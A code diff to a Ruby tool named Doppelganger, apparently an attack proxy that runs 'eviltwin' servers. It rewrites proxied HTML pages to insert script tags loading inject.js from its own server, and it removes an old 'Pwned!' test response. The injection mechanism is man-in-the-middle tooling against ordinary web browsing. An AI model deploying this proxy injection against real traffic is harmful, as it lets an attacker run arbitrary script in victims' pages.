@@ -4,6 +4,7 @@
 # define external libraries
 require "rubygems"
 require "dnsruby"
+#require "packr"
 require "optparse"
 require "socket"
 require "net/http"
@@ -16,9 +17,9 @@ require "pp"
 require "base64"
 
 $eviltwin_mapping = nil
+$eviltwins = []
 
 $doppelganger_config = nil
-
 
 class Doppelganger
 	@config = nil
@@ -80,6 +81,11 @@ class Doppelganger
 		@HttpdServer.Start
 		
 		Process.wait
+
+		$eviltwins.each {|twin| 
+			twin.Shutdown 
+		}
+
 		@HttpdServer.remove_generated_files
 	end
 
@@ -92,6 +98,10 @@ class Doppelganger
 		def initialize(config)	
 			config[:ProxyPort] = 0
 			@config = config			
+		end
+
+		def Server
+			@Server
 		end
 
 		def Start
@@ -119,6 +129,7 @@ class Doppelganger
 			@Server.start
 		end
 
+		$eviltwins << self
 		return {
 			:Server => host,
 			:Port => @Server.config[:Port]
@@ -134,6 +145,7 @@ class Doppelganger
 
 	class Proxy
 		@InjectionScripts = nil
+		#@PackedScripts = nil
 
 		@ProxyAddr = nil
 		@ProxyPort = nil
@@ -152,7 +164,8 @@ class Doppelganger
 
 		def initialize(config)
 			# Javascript get loaded in reverse order (LIFO)
-			@InjectionScripts = Array["inject.js", "prototype.js"]
+			@InjectionScripts = Array["prototype.js", "inject.js"]
+			#@PackedScripts = {}
 
 			@ProxyAddr = config[:ProxyAddr]
 			@ProxyPort = config[:ProxyPort]
@@ -161,6 +174,8 @@ class Doppelganger
 			@ProxyExclusionList = nil
 			@ProxyInclusionList = nil
 			@ProxyPid = nil
+
+			@HttpdFileRoot = config[:HttpdFileRoot]
 
 			if @ProxyInclusionFile != nil
 				if @ProxyExclusionFile != nil
@@ -248,10 +263,22 @@ class Doppelganger
 
 					#TODO: Inject Javascript
 					@InjectionScripts.each { |script|
+						#file = File.open("#{@HttpdFileRoot}#{script}", "r")						
+						#unpacked_code = file.read
+						#packed_code = Packr.pack(unpacked_code, :shrink_vars => true, :protect => ["$super"])
+
+						#@PackedScripts[script] = unpacked_code
+
+						#html = "<script language=\"javascript\" type=\"text/javascript\">#{unpacked_code}</script></head>"
 						js_url = server_url + script
-						html = "<head><script src=\"" + js_url + "\" language=\"javascript\" type=\"text/javascript\"></script>"
-						response.body.gsub!(/\<head\>/i, html)
+						html = "<script src=\"" + js_url + "\" language=\"javascript\" type=\"text/javascript\"></script></head>"
+						response.body.gsub!(/\<\/head\>/i, html)
 					}	
+
+					#init_js = 'Event.observe(window, "load", function() { initialize_doppelganger(); });'
+					#init_tags = "<script language=\"javascript\" type=\"text/javascript\">#{init_js}</script></head>"
+					#response.body.gsub!(/\<\/head\>/i, init_tags)
+
 					return response.body
 			else
 				return response.body				
@@ -465,23 +492,9 @@ class DoppelgangerCGI < WEBrick::HTTPServlet::AbstractServlet
 
 	def do_GET(request, response)
 		
-	uri = URI.parse(request.request_uri.to_s)
-
-	http = Net::HTTP.new(uri.host, uri.port)
-   	http.use_ssl = true if uri.scheme == "https"  # enable SSL/TLS
-    	http.start {
-      		http.request_get(uri.path) {|res|
-			$content_type = "Content-type: " + res['content-type'] + "\r\n\r\n"
-		
-			$body = "Pwned!"
-     	 }
-   	}
-
-	#pp $body
-
 	status, type, body = process_request(request)	    
 	response.status = status
-	response['Content-Type'] = type
+	response['Content-Type'] = "text/plain" #type
 	response.body = body
 		
   end
@@ -492,9 +505,14 @@ class DoppelgangerCGI < WEBrick::HTTPServlet::AbstractServlet
 		response = []
 
 		header = {}
+		#pp request.raw_header
     request.raw_header.each {|line| 
+			puts line
 			key, item = line.split(":") 
+			header[key] = item
 		}
+
+		pp header
 
 		#request.header.each { |key| header[key] = request.header[key][0] }
 
